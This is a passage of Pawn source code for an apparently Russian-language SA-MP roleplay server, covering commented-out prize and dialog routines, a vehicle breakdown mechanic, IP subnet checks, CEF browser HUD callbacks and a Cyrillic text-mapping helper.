			else strcat(STRING_GLOBAL, "\t\t");
			strcat(STRING_GLOBAL, "\n");
		}

		last_index += 1;
		printf("idx = %d", idx);
	}

	format(fmt_info, sizeof fmt_info, "Свободные дома (%d-%d)", count, count+99);

	printf("s %s", STRING_GLOBAL);

	ShowPlayerDialog
	(
		playerid, 0, DIALOG_STYLE_MSGBOX,
		fmt_info,
		STRING_GLOBAL,
		"Далее", "Закрыть"
	);

	return 1;
}*/

/*stock PlayerReceivingPresent(playerid)
{
	new prize = random(6);

	switch(prize)
	{
		case 0:
		{
			new credits = random(200) + 100;

			PI[playerid][pCredits] += credits;
			PI[playerid][pTotalCredits] += credits;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET credits=%d, totalcredits=%d WHERE id='%d'", PI[playerid][pCredits], PI[playerid][pTotalCredits], PI[playerid][pID]);
			mysql_query(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы подобрали яйцо. Ваш приз: %d кредитов", credits);
			SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
		}
		case 1:
		{
			new year, month, day;
			new current_date = getdate(year, month, day);

			PI[playerid][pVip] = 1;
			PI[playerid][pVipTime] = current_date + 30;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET vip=%d, viptime=%d WHERE id='%d'", PI[playerid][pVip], PI[playerid][pVipTime], PI[playerid][pID]);
			mysql_query(dbHandle, STRING_GLOBAL);

			SendClientMessage(playerid, C_OSNOV, "Вы подобрали яйцо. Ваш приз: VIP аккаунт на 30 дней");
		}
		case 2:
		{
			new rand = random(3654554654465);

			if(654554654465 <= rand <= 654554664465 && PI[playerid][pAdmin] == 0 && PI[playerid][pLevel] >= 10)
			{
				SendClientMessage(playerid, C_OSNOV, "Вы подобрали яйцо. Ваш приз: админ-права 1 уровня, для активации введите /alogin");

				new admin_level = 1;

				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ADMIN" WHERE `name` = '%s'", GetName(playerid));
				mysql_tquery(dbHandle, STRING_GLOBAL, "SetAdmin", "isi", playerid, GetName(playerid), admin_level);

				printf("%s[%d] rand: %d rand %:", rand, rand % 7);
			}
			else PlayerReceivingPresent(playerid);
		}
		case 3:
		{
			new exp = random(10) + 5;

			PI[playerid][pExp] += exp;

			if(PI[playerid][pExp] >= (PI[playerid][pLevel]+1)*4)
			{
				SendClientMessage(playerid, TEAM_BLUE_COLOR, "Ваш игровой возраст повысился!");
				PI[playerid][pLevel]++;
				PI[playerid][pAge]++;
				PI[playerid][pExp] = 0;
				SetPlayerScore(playerid, PI[playerid][pLevel]);
				MysqlUpdatePlayerInt(playerid, "level", PI[playerid][pLevel]);
				MysqlUpdatePlayerInt(playerid, "age", PI[playerid][pAge]);
				MysqlUpdatePlayerInt(playerid, "exp", PI[playerid][pExp]);
			}
			if(PI[playerid][pLevel] == 4 && PI[playerid][pExp] == 0)
			{
				if(!strcmp(PI[playerid][pReferal], "None", true)) { }
				else
				{
					new targetid = GetPlayerID(PI[playerid][pReferal]);
					if(targetid != INVALID_PLAYER_ID)
					{
						GiveMoney(targetid, 100000);
						SendClientMessage(targetid, COLOR_LIME, "Вы получили {63BD4E}100000р {FFFFFF}за приглашенного игрока");
					}
					else
					{
						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s'", PI[playerid][pReferal]);
						mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineSetReferalMoney", "i", playerid);
					}
				}
			}

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET exp=%d WHERE id='%d'", PI[playerid][pExp], PI[playerid][pID]);
			mysql_query(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы подобрали яйцо. Ваш приз: %d EXP", exp
*/
/*stock Trash()
{
	if(PlayerToPoint(3.0, playerid, 1827.1803, 2038.5769, 16.0600) || PlayerToPoint(3.0, playerid, 1538.2103, -1849.1766, 13.5469)
	|| (PlayerToPoint(3.0, playerid, 1831.1613, 2036.1375, 16.0600) || PlayerToPoint(3.0, playerid, 1469.1035, -1847.5150, 13.5469)
	|| (PlayerToPoint(3.0, playerid, 1836.2821, 2039.5658, 16.0600) || PlayerToPoint(3.0, playerid, 1420.5580, -1844.3562, 13.5469)
	|| (PlayerToPoint(3.0, playerid, 1337.5389, -1816.2423, 13.5469) || PlayerToPoint(3.0, playerid, 1337.0709, -1842.7561, 13.5469)
	|| (PlayerToPoint(3.0, playerid, 1337.5314, -1773.3726, 13.5469)) { return 1; }
	return 1;
}*/
forward SystemPolomka(playerid);
public SystemPolomka(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) == PLAYER_STATE_DRIVER /*|| GetVehicleData(vehicleid, veh_engine) == true*/)
	{
	    if(GetVehicleData(vehicleid, veh_milliage) == 12000.0) // 500km
		{
	        SetVehicleHealth(vehicleid, 800.0);
	    	SendClientMessage(playerid,COLOR_GREY,"[CHECK ENGINE] Состояние вашего двигателя снизилось на 20%");
	    }
	    else if(GetVehicleData(vehicleid, veh_milliage) == 960000.0) // 800km
		{
	        SetVehicleHealth(vehicleid, 600.0);
	    	SendClientMessage(playerid,COLOR_GREY,"[CHECK ENGINE] Состояние вашего двигателя снизилось на 40%");
	    }
	    else if(GetVehicleData(vehicleid, veh_milliage) == 1320000.0) // 1100km
		{
	        SetVehicleHealth(vehicleid, 500.0);
	    	SendClientMessage(playerid,COLOR_GREY,"[CHECK ENGINE] Состояние вашего двигателя снизилось на 60%");
	    }
	    else if(GetVehicleData(vehicleid, veh_milliage) == 1800000.0) // 1500km
		{
	        SetVehicleHealth(vehicleid, 500.0);
	    	SendClientMessage(playerid,COLOR_GREY,"[CHECK ENGINE] Состояние вашего двигателя снизилось на 80%");
	    	SendClientMessage(playerid,COLOR_GREY,"[CHECK ENGINE] Двигатель заглох. Вызовите механика.");
	    	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(vehicleid,(GetVehicleData(vehicleid, veh_engine))?(false):(true),lights,alarm,doors,bonnet,boot,objective);
			SetVehicleData(vehicleid, veh_engine, GetVehicleData(vehicleid, veh_engine)?(false):(true));
	    }
	}
	return 1;
}

stock GetPlayerSubnet_(playerid, buffer[], size=sizeof(buffer)) // by Daniel_Cortez \\ pro-pawn.ru
{
    GetPlayerIp(playerid, buffer, size);
    for(new i=0,dots=0; ; ++i)
        switch(buffer[i])
        {
            case '\0':
                break;
            case '.':
                if(++dots == 2)
                {
                    buffer[i] = '\0';
                    break;
                }
        }
}

stock GetPlayerSubnet(buffer[])
{// by Daniel_Cortez \\ pro-pawn.ru
    for(new i=0,dots=0; ; ++i)
        switch(buffer[i])
        {
            case '\0':
                break;
            case '.':
                if(++dots == 2)
                {
                    buffer[i] = '\0';
                    break;
                }
        }
}

stock CheckSubnet(playerid)
{
    new nowip[16], oldip[16];
	GetPlayerIp(playerid, nowip, sizeof(nowip));
	GetPlayerSubnet(nowip);
	strmid(oldip, PI[playerid][pLastIP], 0, 16, 16);
	GetPlayerSubnet(oldip);
	if(strcmp(nowip, oldip, true) == 0) return 1;//подсеть совпадает
	else return 0;
}

public OnCefInitialize(playerid, success)
{
    if(success)
    {
        SetPVarInt(playerid, "cefload", 1);
        g_CefLoaded[playerid] = true;

        // Создаем браузер (скрыт по умолчанию)
        cef_create_browser(playerid, CEF_INTERFACE_BROWSER_ID, "http://wh24045.web2.maze-tech.ru/cef/index.html", false, false);

        SendClientMessage(playerid, -1, "CEF успешно инициализирован!");
    }
    else
    {
        SendClientMessage(playerid, -1, "Ошибка: Не удалось инициализировать CEF!");
    }
    return 1;
}

public OnCefBrowserCreated(playerid, browser_id, status_code)
{
    if(browser_id != CEF_INTERFACE_BROWSER_ID) return 1;

    if(status_code != 200)
    {
        SendClientMessage(playerid, -1, "У вас проблемы с подключением к интерфейсу!");
        g_CefLoaded[playerid] = false;
        DeletePVar(playerid, "cefload");
    }
    else
    {
        SendClientMessage(playerid, -1, "Интерфейс успешно загружен!");

        // Задержка перед показом HUD
        SetTimerEx("ShowHudDelayed", 1000, false, "i", playerid);
    }
    return 1;
}

forward ShowHudDelayed(playerid);
public ShowHudDelayed(playerid)
{
    if(g_CefLoaded[playerid])
    {
        printf("Showing HUD for player %d", playerid);
        cef_emit_event(playerid, "awesome:visible:hud", CEFINT(1)); // Показать HUD
        g_HudVisible[playerid] = true;
        UpdatePlayerHud(playerid); // Обновляем данные
    }
}

/*forward TimerMoney(playerid);
public TimerMoney(playerid)
{
	new fmt_str[144];
	format(fmt_str, sizeof(fmt_str),"%d РУБ.",PI[playerid][pCash]);
	PlayerTextDrawSetString(playerid, money_td_player[playerid][8], fmt_str);
}*/

stock UpdatePlayerHud(playerid)
{
    if(!g_CefLoaded[playerid] || !g_HudVisible[playerid]) return 0;

    new money = GetPlayerMoney(playerid);
    new Float:health, Float:armour;
    GetPlayerHealth(playerid, health);
    GetPlayerArmour(playerid, armour);
    new weaponid = GetPlayerWeapon(playerid);
    new ammo = (weaponid > 0) ? GetPlayerAmmo(playerid) : 0;

    cef_emit_event(playerid, "game:data:playerStats",
        CEFINT(playerid),
        CEFFLOAT(health),
        CEFFLOAT(armour),
        CEFINT(money),
        CEFINT(weaponid),
        CEFINT(ammo),
        CEFINT(0)
    );

    return 1;
}

forward OnCefClientEvent(playerid, event_name[], arguments[]);
public OnCefClientEvent(playerid, event_name[], arguments[])
{
    // Пример: обработка события от HUD (например, нажатие кнопки)
    if(!strcmp(event_name, "awesome:client:event"))
    {
        SendClientMessage(playerid, -1, "Получено событие от HUD!");
        // Здесь можно обработать данные из arguments[], если HUD отправляет их
    }
    return 1;
}

stock FormatMoney(amount)
{
    new string[32], temp[32];
    format(temp, sizeof(temp), "%d", amount);
    new len = strlen(temp), commas;
    for(new i = 0; i < len; i++)
    {
        if((len - i - 1) % 3 == 0 && i != len - 1) commas++;
        string[i + commas] = temp[i];
        if((len - i - 1) % 3 == 0 && i != len - 1) string[i + commas + 1] = ',';
    }
    return string;
}

stock TranslateText(string[])
{
new result[128];
for (new i = 0; i < sizeof(result); i++)
{
switch (string[i])
{
	  case 'а':result[i] = 'a';
      case 'А':result[i] = 'A';
      case 'б':result[i] = '—';
      case 'Б':result[i] = 'Ђ';
      case 'в':result[i] = 'ў';
      case 'В':result[i] = '‹';
      case 'г':result[i] = '™';
      case 'Г':result[i] = '‚';
      case 'д':result[i] = 'љ';
      case 'Д':result[i] = 'ѓ';
      case 'е':result[i] = 'e';
      case 'Е':result[i] = 'E';
      case 'ё':result[i] = 'e';
      case 'Ё':result[i] = 'E';
      case 'ж':result[i] = '›';
      case 'Ж':result[i] = '„';
      case 'з':result[i] = 'џ';
      case 'З':result[i] = '€';
      case 'и':result[i] = 'њ';
      case 'И':result[i] = '…';
      case 'й':result[i] = 'ќ';
      case 'Й':result[i] = '…';
      case 'к':result[i] = 'k';
      case 'К':result[i] = 'K';
      case 'л':result[i] = 'ћ';
      case 'Л':result[i] = '‡';
      case 'м':result[i] = 'Ї';
      case 'М':result[i] = 'M';
      case 'н':result[i] = '®';
      case 'Н':result[i] = 'H';
      case 'о':result[i] = 'o';
      case 'О':result[i] = 'O';
      case 'п':result[i] = 'Ј';
      case 'П':result[i] = 'Њ';
      case 'р':result[i] = 'p';
      case 'Р':result[i] = 'P';
      case 'с':result[i] = 'c';
      case 'С':result[i] = 'C';
      case 'т':result[i] = '¦';
      case 'Т':result[i] = 'Џ';
      case 'у':result[i] = 'y';
      case 'У':result[i] = 'Y';
      case 'ф':result[i] = '?';
      case 'Ф':result[i] = 'Ѓ';
      case 'х':result[i] = 'x';
      case 'Х':result[i] = 'X';
      case 'ц':result[i] = '$';
      case 'Ц':result[i] = '‰';
      case 'ч':result[i] = '¤';
      case 'Ч':result[i] = 'Ќ';
      case 'ш':result[i] = 'Ґ';
      case 'Ш':result[i] = 'Ћ';
      case 'щ':result[i] = 'Ў';
      case 'Щ':result[i] = 'Љ';
      case 'ь':result[i] = '©';
      case 'Ь':result[i] = '’';
      case 'ъ':result[i] = 'ђ';
      case 'Ъ':result[i] = '§';
      case 'ы':result[i] = 'Ё';
      case 'Ы':result[i] = '‘';
      case 'э':result[i] = 'Є';
      case 'Э':result[i] = '“';
      case 'ю':result[i] = '«';
      case 'Ю':result[i] = '”';
      case 'я':result[i] = '¬';
      case 'Я':result[i] = '•';

default: result[i] = string[i];
}
}
return result;
